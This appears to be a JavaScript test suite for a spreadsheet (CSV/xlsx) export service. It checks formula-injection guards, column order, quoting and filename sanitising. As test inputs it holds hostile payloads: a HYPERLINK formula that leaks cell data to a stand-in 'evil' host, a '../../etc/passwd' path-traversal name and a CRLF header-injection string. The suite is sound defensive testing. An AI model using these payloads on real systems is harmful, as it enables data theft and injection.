/**
 * Exporting a KRT — the file a curator opens in Excel.
 *
 * Of everything this app exports, the KRT carries the least trusted content:
 * cells an author uploaded plus rows a model wrote. A stored
 * `=HYPERLINK("http://evil/?x="&A1,"x")` executes on open unless the exporter
 * neutralises it, and Papa.unparse — which the CSV path uses — quotes to
 * RFC-4180 but does not do this. That guard is the reason this file exists.
 *
 * `exportRows` is the DB-free entry point and reaches both formats.
 */

'use strict';

const { test } = require('node:test');
const assert = require('node:assert/strict');
const ExcelJS = require('exceljs');

const { exportRows } = require('./krt.service');

const row = (over = {}) => ({
  'RESOURCE TYPE': 'Antibody',
  'RESOURCE NAME': 'anti-TagFP',
  'SOURCE': 'Evrogen',
  'IDENTIFIER': 'RRID:AB_2313584',
  'NEW/REUSE': 'reuse',
  'ADDITIONAL INFORMATION': '',
  ...over
});

const csvOf = async (rows) => (await exportRows(rows, 'csv')).buffer.toString('utf-8');

// ─────────────────────────────────────────────────────────────────────────────
// Formula injection
// ─────────────────────────────────────────────────────────────────────────────

test('every formula trigger is neutralised in the CSV', async () => {
  for (const payload of [
    '=HYPERLINK("http://evil/?x="&A1,"click")',
    '=1+2',
    '+1234',
    '-1+2',
    '@SUM(A1)'
  ]) {
    const csv = await csvOf([row({ 'RESOURCE NAME': payload })]);
    const cell = csv.split('\n')[1];
    assert.ok(!/(^|,)"?[=+@]/.test(cell.replace(/^[^,]*,/, '')),
      `"${payload}" reached the file able to execute: ${cell}`);
    assert.ok(cell.includes("'"), `"${payload}" must be prefixed with an apostrophe`);
  }
});

test('the guard applies to EVERY column, not just the name', async () => {
  // A payload can be parked anywhere the author can type.
  for (const column of ['RESOURCE TYPE', 'RESOURCE NAME', 'SOURCE', 'IDENTIFIER', 'NEW/REUSE', 'ADDITIONAL INFORMATION']) {
    const csv = await csvOf([row({ [column]: '=1+2' })]);
    assert.ok(csv.includes("'=1+2"), `${column} was exported unguarded`);
    assert.ok(!/,=1\+2/.test(csv), `${column} left a live formula`);
  }
});

test('ordinary content is not mangled by the guard', async () => {
  const csv = await csvOf([row({
    'RESOURCE NAME': 'anti-TagFP (1:1000)',
    'ADDITIONAL INFORMATION': 'Stored at -20 degrees, see note'
  })]);
  assert.ok(csv.includes('anti-TagFP (1:1000)'));
  assert.ok(csv.includes('Stored at -20 degrees, see note'),
    'a hyphen mid-sentence is not a formula trigger');
});

test('a value that merely CONTAINS an equals sign is left alone', async () => {
  const csv = await csvOf([row({ 'IDENTIFIER': 'https://example.org/q?a=1&b=2' })]);
  assert.ok(csv.includes('https://example.org/q?a=1&b=2'));
  assert.ok(!csv.includes("'https"), 'only a LEADING trigger is neutralised');
});

test('the xlsx path writes text cells, never formula cells', async () => {
  // ExcelJS only creates a formula when handed { formula }, so a string stays a
  // string — this pins that, since the CSV guard does not apply here.
  const { buffer } = await exportRows([row({ 'RESOURCE NAME': '=1+2' })], 'xlsx');
  const workbook = new ExcelJS.Workbook();
  await workbook.xlsx.load(buffer);
  const cell = workbook.getWorksheet('KRT').getRow(2).getCell(2);
  assert.equal(cell.formula, undefined, 'an exported cell must never be a live formula');
  assert.equal(cell.value, '=1+2', 'and its text must survive intact');
});

// ─────────────────────────────────────────────────────────────────────────────
// Shape of the file
// ─────────────────────────────────────────────────────────────────────────────

test('the CSV leads with the canonical header row, in order', async () => {
  const csv = await csvOf([row()]);
  assert.equal(
    csv.split('\n')[0].trim(),
    'RESOURCE TYPE,RESOURCE NAME,SOURCE,IDENTIFIER,NEW/REUSE,ADDITIONAL INFORMATION'
  );
});

test('columns keep their order regardless of the object\'s key order', async () => {
  const csv = await csvOf([{
    'NEW/REUSE': 'new', 'RESOURCE NAME': 'B', 'IDENTIFIER': 'id-1',
    'RESOURCE TYPE': 'Dataset', 'SOURCE': 'GEO', 'ADDITIONAL INFORMATION': ''
  }]);
  assert.match(csv.split('\n')[1], /^Dataset,B,GEO,id-1,new,/);
});

test('a missing field exports as empty rather than "undefined"', async () => {
  const csv = await csvOf([{ 'RESOURCE NAME': 'lonely' }]);
  assert.ok(!csv.includes('undefined'));
  assert.match(csv.split('\n')[1], /^,lonely,,,,/);
});

test('commas, quotes and newlines in a cell are quoted, not lost', async () => {
  const csv = await csvOf([row({ 'ADDITIONAL INFORMATION': 'a,b "quoted"\nsecond line' })]);
  assert.ok(csv.includes('"a,b ""quoted""\nsecond line"'));
});

test('an empty export still produces a header', async () => {
  const csv = await csvOf([]);
  assert.ok(csv.startsWith('RESOURCE TYPE,'));
});

// ─────────────────────────────────────────────────────────────────────────────
// The filename, which comes from an uploaded file name
// ─────────────────────────────────────────────────────────────────────────────

test('a path separator cannot survive into the filename', async () => {
  // The base name can come from an uploaded file name, and it ends up in a
  // Content-Disposition header. Dots are allowed through (they are part of
  // ordinary names) — what must not survive is anything that would make the
  // value a PATH, or break out of the header.
  const { filename } = await exportRows([row()], 'csv', '../../etc/passwd');
  assert.ok(!/[/\\]/.test(filename), filename);
  assert.ok(filename.endsWith('.csv'));
});

test('nothing in the filename can break the response header', async () => {
  const { filename } = await exportRows([row()], 'csv', 'evil"\r\nX-Injected: 1');
  assert.ok(!/["\r\n]/.test(filename), JSON.stringify(filename));
});

test('an existing extension is not doubled', async () => {
  assert.equal((await exportRows([row()], 'csv', 'my-krt.csv')).filename, 'my-krt.csv');
  assert.equal((await exportRows([row()], 'xlsx', 'my-krt.xlsx')).filename, 'my-krt.xlsx');
});

test('an absurdly long name is truncated', async () => {
  const { filename } = await exportRows([row()], 'csv', 'x'.repeat(400));
  assert.ok(filename.length <= 105, filename.length);
});

test('an empty name falls back rather than producing a bare extension', async () => {
  assert.equal((await exportRows([row()], 'csv', '')).filename, 'krt.csv');
  assert.equal((await exportRows([row()], 'csv', '///')).filename, '_.csv');
});

test('the format decides the mime type', async () => {
  assert.equal((await exportRows([row()], 'csv')).mimeType, 'text/csv');
  assert.match((await exportRows([row()], 'xlsx')).mimeType, /spreadsheetml/);
});
